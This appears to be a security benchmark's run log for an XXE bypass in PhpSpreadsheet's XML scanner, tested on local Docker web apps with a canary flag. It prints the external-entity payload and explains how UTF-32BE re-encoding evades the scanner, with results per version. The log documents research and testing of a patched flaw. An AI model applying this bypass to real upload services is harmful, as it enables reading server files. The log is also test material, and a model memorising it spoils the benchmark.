xxe_phpspreadsheet_ucs4 — runtime gate evidence  (REAL WEB APP, EXTERNAL HTTP UPLOAD)
====================================================================================
REBUILT 2026-07-16: replaced the banned in-process Driver.php harness with a REAL PHP web app
(www/index.php) that accepts an EXTERNAL HTTP file upload (`POST /upload`, multipart field "file")
and loads it via \PhpOffice\PhpSpreadsheet\IOFactory::load(). The XmlScanner XXE sink runs ONLY
inside that HTTP-triggered load path — the oracle never touches the library in-process.

Gate run: 2026-07-16 via `python3 oracle.py --run-gate --with-v2` on real Docker
(Docker 29.4.0, darwin arm64, Compose v5.1.2). Recipe-only: each profile builds the EXACT published
phpoffice/phpspreadsheet release (composer:2.2 deps stage — LTS, predates the advisory-block policy)
and serves www/index.php via the PHP built-in server on a published host port.

Serving / trigger:
  V0 = phpspreadsheet 1.7.0  on php:7.2.0-cli  (libxml 2.9.x)  http://127.0.0.1:18790/upload
  V1 = phpspreadsheet 1.29.2 on php:8.2-cli    (libxml 2.9.14) http://127.0.0.1:18791/upload   <- target
  V2 = phpspreadsheet 1.29.4 on php:8.2-cli    (libxml 2.9.14) http://127.0.0.1:18792/upload   <- negative
  On PHP 8.x the scanner's disableEntityLoaderCheck() is a no-op; with the app's LIBXML_DTDLOAD|
  LIBXML_NOENT options libxml resolves external entities, so the SCANNER regex is the sole guard —
  the faithful exploitable config for 1.29.x. On 7.2.0 the entity loader is already enabled.

Malicious spreadsheet: the crafted xl/worksheets/sheet1.xml is packaged into a VALID .xlsx by
build_fixture.php (this version's OWN writer scaffolds a valid workbook, then the crafted sheet is
swapped in). This is PACKAGING ONLY — build_fixture.php never loads the file; the XmlScanner sink is
exercised solely by the web app when the .xlsx is UPLOADED over real HTTP. The malicious file is NOT
baked into the image (the oracle builds it and POSTs it as multipart/form-data).

Canary: ${PCB_FLAG} random per-run token written to /flag AND /canary/flag.txt (both outside the app
dir) at container start. External entity SYSTEM "file:///canary/flag.txt" reflects it into cell A1 ->
the /upload handler returns "A1=..." in the HTTP response body.

PAYLOADS:
  ORIGINAL (prior-form, double-UTF-7): ascii `<?xml encoding="UTF-7"?>` header + the DOCTYPE/ENTITY
      body DOUBLE mb-UTF-7-encoded (the CVE-2019-12331 residual form the V1 guard was hardened to
      block). Given in original_poc.py.
  RESIDUAL (UCS-4/UTF-32): the SAME `<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///canary/flag.txt"> ]>
      ...&xxe;` sheet re-encoded to UTF-32BE, NO BOM, declared encoding="UTF-16" (every ASCII char =
      4 bytes 00 00 00 XX). findCharSet can't read `encoding=` through the null bytes (returns UTF-8,
      no decode); the \0? "<!DOCTYPE" scan tolerates only ONE null so the 3-null-padded marker evades
      it; libxml auto-detects UTF-32BE from 00 00 00 3C ("<") at parse time and resolves the entity.
      Held out in _heldout/bypass_poc.py (four UTF-32 vectors; the oracle uses the first that exfils).

RESULT MATRIX over REAL HTTP (flag PCBFLAG_95827862de4ef3304e420c66b3e0bdd2, all HTTP 200):

  [V0 1.7.0  / original double-UTF-7]  RESULT=LOADED   A1="PCBFLAG_95827862...\n"   FLAG REACHED
  [V1 1.29.2 / original double-UTF-7]  RESULT=BLOCKED: Reader\Exception: Suspicious Double-encoded XML, ... aborted ...   (no flag)
  [V1 1.29.2 / residual UCS-4 nobom]   RESULT=LOADED   A1="PCBFLAG_95827862...\n"   FLAG REACHED  <-- bypass
  [V2 1.29.4 / original double-UTF-7]  RESULT=BLOCKED: Reader\Exception: UTF-7 encoding not permitted   (no flag)
  [V2 1.29.4 / residual UCS-4]         RESULT=BLOCKED: Reader\Exception: Detected use of ENTITY in XML, ... aborted ...   (no flag)

GATE (flag_oracle.validate_case, Variant A):
  original_poc_reaches_flag_on_v0 = true
  original_poc_blocked_on_v1      = true
  bypass_poc_reaches_flag_on_v1   = true
  passed                          = true
  + original_blocked_on_v2        = true
  + bypass_blocked_on_v2          = true

Additional booleans (source-verified against XmlScanner.php at the three tags):
  v1_has_guard            = true   (1.29.2 findCharSet + toUtf8 double-encode re-check + \0? DOCTYPE scan)
  guard_modified_sink     = true   (CVE-2024-47873 modifies findCharSet()+scan() in the SAME XmlScanner.php)
  distinct_commits        = true   (CVE-2019-12331 fix landed 1.8.0; CVE-2024-47873 fix = 31d7f7962e05 in 1.29.4)
  distinct_fixed_versions = true   (1.8.0 vs 1.29.4)
  external_http_trigger   = true   (POST /upload over real HTTP; sink reached only via IOFactory::load in the web app)
  runs_real_software      = true   (unmodified published phpoffice/phpspreadsheet releases)

Teardown: oracle ran `PCB_FLAG=teardown docker compose --profile v0 --profile v1 --profile v2 down
-v --rmi all` + `docker image prune -f`. Case images pcb/phpspreadsheet-xxe-ucs4-web:{1.7.0,1.29.2,
1.29.4} deleted (verified absent). php:7.2.0-cli / php:8.2-cli / composer:2.2 base images kept. No
vendor/ committed; case dir = TEXT only (the malicious spreadsheet is generated by build_fixture.php).

Distinctness vs cases/xxe_phpspreadsheet_utf7: that case is CVE-2018-19277 -> CVE-2019-12331 and its
residual is UTF-7 DOUBLE-ENCODING (an extra decode layer). THIS case is CVE-2019-12331 ->
CVE-2024-47873 one lineage-step later, and its residual is a WIDER MULTIBYTE ENCODING CLASS
(UCS-4/UTF-32 null-byte interleaving) that defeats the encoding-DETECTION regex + the null-tolerant
scan itself. Same XmlScanner sink; here the double-UTF-7 payload is the (blocked) ORIGINAL, making
the incomplete-fix lineage explicit.

STALE LEFTOVER FILES (from the old in-process design, NO rm per directive — no longer referenced by
docker-compose.yml / case.json / oracle.py): Driver.php, Dockerfile.php72, Dockerfile.php8.
